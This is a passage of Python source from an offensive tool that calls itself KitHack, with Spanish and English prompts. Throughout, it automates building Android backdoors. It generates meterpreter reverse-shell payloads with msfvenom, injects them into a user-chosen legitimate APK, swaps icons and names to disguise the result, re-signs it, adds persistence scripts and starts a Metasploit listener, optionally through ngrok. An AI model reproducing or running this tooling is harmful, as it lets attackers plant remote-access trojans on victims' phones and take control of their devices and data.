								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST: 
										os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Press any key to continue...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
										pause("\n{}Press any key to continue...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
								pause("{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()

						# Salida de bucle
						OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))					
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] Do you want to create persistence to your APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break						
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()						
					
					elif a == '02':
						print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
						print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
						print ('{0}[02]{1} Use the new framework method'.format(WHITE, YELLOW))

						m = input("{0}framework >> {1}".format(RED, DEFAULT))
						m = m.zfill(2)

						if m == '01':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "framework - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] Enter a name for your output file? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
							location = os.getcwd()
							if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						elif m == '02':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
							location = os.getcwd()
							print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
							print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)				
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/original -o output/kithack.apk')
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						else:
							print("\n{}[X] OPCION INVALIDA\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('clear')
							main()	

					else:
						print("\n{}[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

			elif pay == '02':
					print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
					print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
					
					a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					a = a.zfill(2)
					
					if a == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
							break
						else:
							Tk().withdraw()
							icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
							print("\n{0}ICON: {1}".format(YELLOW, icon))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
							file = open("/tmp/data.txt", "w")
							file.write(icon + '\n')
							file.write(mainout)
							file.close()
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
							print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
							time.sleep(4)						
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/payload -o output/kithack.apk')
							location = os.getcwd()
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()

						# Salida de bucle
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break						
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
					
					elif a == '02':
						print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
						print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
						print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

						m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
						m = m.zfill(2)

						if m == '01':					
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
							location = os.getcwd()
							if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()							
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					
						elif m == '02':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
							location = os.getcwd()
							print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
							print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)				
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/original -o output/kithack.apk')
							if os.path.isfile('output/kithack.apk'):							
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						else:
							print("{}\n[X] OPCION INVALIDA\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('clear')
							main()	

					else:
						print("\n{}[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

			elif pay == '03':
					print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
					print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
					
					a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					a = a.zfill(2)
					
					if a == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
							break
						else:
							Tk().withdraw()
							icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
							print("\n{0}ICON: {1}".format(YELLOW, icon))						
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
							file = open("/tmp/data.txt", "w")
							file.write(icon + '\n')
							file.write(mainout)
							file.close()
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
							print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
							time.sleep(4)						
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/payload -o output/kithack.apk')
							location = os.getcwd()
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()

						# Salida de bucle
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break						
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
